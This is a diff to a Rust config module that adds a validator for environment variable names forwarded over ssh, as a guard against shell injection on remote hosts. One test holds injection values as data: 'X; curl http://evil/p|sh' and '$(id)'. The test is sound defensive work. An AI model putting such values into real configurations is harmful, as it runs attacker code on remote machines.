@@ -1,8 +1,20 @@
-//! Configuration the non-UI side reads: the `[launcher]` and `[debug]` sections
-//! (used by the launcher and the daemon) plus the shared loader. The dashboard's
-//! presentation config — colors, thresholds, polling, keybinds, all ratatui-y —
-//! lives in the `captain-miao` crate and layers on top, parsing the *same*
-//! `config.toml` (serde ignores each side's unknown keys).
+//! Configuration outside the dashboard's presentation layer: the `[launcher]`
+//! and `[debug]` sections (read by the launcher and the daemon), `[remote]
+//! inherit_env`, and the shared loader. The dashboard's presentation config —
+//! colors, thresholds, polling, keybinds, all ratatui-y — lives in the
+//! `captain-miao` crate and layers on top, parsing the *same* `config.toml`
+//! (serde ignores each side's unknown keys).
+//!
+//! **Living here does not mean the host reads it.** [`get`] resolves
+//! [`config_path`] on whatever machine the process runs on, so a remote host
+//! with a deployed `miao-server` has its own `config.toml` and the two never
+//! meet. Which machine supplies a key is decided by where it is *read*, not by
+//! which crate declares it: `[launcher]` is read from `cm-core`'s own backend
+//! and launcher, so the **host** supplies it — while `[remote] inherit_env` is
+//! read only by the dashboard (`src/backend/mod.rs`) and reaches the host as an
+//! argv flag, so a host-side `config.toml` setting it does nothing. That single
+//! reader is also why validating names on load is sufficient; see
+//! [`is_valid_env_name`]. `docs/remote-sessions.md` §8 has the full table.
 
 use std::path::{Path, PathBuf};
 use std::sync::{Arc, OnceLock, PoisonError, RwLock};
@@ -230,6 +242,60 @@ impl Default for DebugConfig {
 // remote
 // =============================================================================
 
+/// True if `name` is a POSIX-shape environment variable name:
+/// `[A-Za-z_][A-Za-z0-9_]*`.
+///
+/// Every name in `[remote] inherit_env` is checked against this, and the check
+/// is **load-bearing in two places at once**, which is why it lives here rather
+/// than at either use site:
+///
+/// * The dashboard splices each name into the argv of an `ssh <target>
+///   miao-server attach …`, and ssh joins its command words with spaces and
+///   hands the result to the account's **login shell** (see `remote_shell_argv`)
+///   — so an unchecked name is remote command execution on every configured
+///   host, from a file (`config.toml`) that is routinely templated or shared.
+/// * The host end writes the names into a TOML `forward_env` array. libshpool
+///   *fails the whole attach* on a config it cannot parse (`config::Manager::load`
+///   returns `Err`, it does not skip), so a name carrying a character TOML
+///   cannot round-trip takes the session down with it.
+///
+/// Both are closed by admitting only the shape a shell and TOML agree on. This
+/// is exactly the set POSIX reserves for environment variable names, so nothing
+/// legitimate is turned away.
+pub fn is_valid_env_name(name: &str) -> bool {
+    let mut chars = name.chars();
+    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
+        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
+/// Drop any `inherit_env` entry that isn't a valid env var name, warning once
+/// per reject.
+///
+/// A malformed entry is skipped rather than failing the parse: this loader
+/// falls back to `CoreConfig::default()` on any error, so rejecting the file
+/// would silently discard the user's *whole* `[launcher]`/`[debug]` config over
+/// one bad name. Dropping the entry keeps the blast radius to the name itself,
+/// and the warning says which.
+fn deserialize_env_names<'de, D>(de: D) -> Result<Vec<String>, D::Error>
+where
+    D: serde::Deserializer<'de>,
+{
+    let names = Vec::<String>::deserialize(de)?;
+    Ok(names
+        .into_iter()
+        .filter(|n| {
+            let ok = is_valid_env_name(n);
+            if !ok {
+                tracing::warn!(
+                    "ignoring [remote] inherit_env entry {n:?}: not an environment \
+                     variable name ([A-Za-z_][A-Za-z0-9_]*)"
+                );
+            }
+            ok
+        })
+        .collect())
+}
+
 #[derive(Debug, Clone, Default, Deserialize)]
 #[serde(default)]
 /// `[remote]` in `config.toml`: knobs for sessions this dashboard reaches over
@@ -242,9 +308,21 @@ pub struct RemoteConfig {
     /// otherwise never reaches the agent. Each name here is threaded to
     /// `miao-server attach` (`--inherit-env`), which hands it to libshpool's
     /// `forward_env`: the value is read live from the attach process's own
-    /// environment on the host (never the dashboard's, never disk) and injected
-    /// into the session. Empty by default — opt in per var, since forwarding a
-    /// secret is a deliberate act.
+    /// environment on the host — never the dashboard's — and injected into the
+    /// session at the moment the session is **created**.
+    ///
+    /// Empty by default — opt in per var, since forwarding a secret is a
+    /// deliberate act, and note what that act costs: libshpool's daemon writes
+    /// every forwarded name and **value** to `$SHPOOL_SESSION_DIR/forward.env`
+    /// on the host, in cleartext, on every attach — `0644`, and on the ssh path
+    /// the `sessions/` dir above it stays `0755` as well, because libshpool only
+    /// hardens it when the attach client has an `SSH_AUTH_SOCK` to link and our
+    /// attach has none. See `docs/remote-sessions.md`.
+    ///
+    /// Entries are filtered to `[A-Za-z_][A-Za-z0-9_]*` on load — see
+    /// [`is_valid_env_name`] for why that check is a security boundary and not
+    /// tidiness.
+    #[serde(deserialize_with = "deserialize_env_names")]
     pub inherit_env: Vec<String>,
 }
 
@@ -267,6 +345,38 @@ mod tests {
     fn remote_inherit_env_defaults_empty() {
         let cfg = CoreConfig::default();
         assert!(cfg.remote.inherit_env.is_empty());
+    }
+
+    #[test]
+    fn env_name_shape_is_posix() {
+        for ok in ["A", "_", "ANTHROPIC_API_KEY", "_x9", "a1_B2"] {
+            assert!(is_valid_env_name(ok), "{ok:?} should be accepted");
+        }
+        for bad in [
+            "",
+            "9LEADING_DIGIT",
+            "HAS-DASH",
+            "HAS SPACE",
+            "HAS.DOT",
+            "HAS$DOLLAR",
+            "UNPRINTABLE\u{7f}",
+            "NON_ASCII_É",
+        ] {
+            assert!(!is_valid_env_name(bad), "{bad:?} should be rejected");
+        }
+    }
+
+    /// The shapes that would otherwise be remote command execution (ssh hands
+    /// the joined argv to a login shell) or an unparseable `forward_env` TOML
+    /// (which fails the whole attach). Dropped per-entry, so the valid names
+    /// beside them still load.
+    #[test]
+    fn remote_inherit_env_drops_shell_unsafe_names() {
+        let cfg: CoreConfig = toml::from_str(
+            "[remote]\ninherit_env = [\"GOOD\", \"X; curl http://evil/p|sh\", \"TWO WORDS\", \"$(id)\", \"ALSO_GOOD\"]\n",
+        )
+        .unwrap();
+        assert_eq!(cfg.remote.inherit_env, ["GOOD", "ALSO_GOOD"]);
     }
 
     #[test]
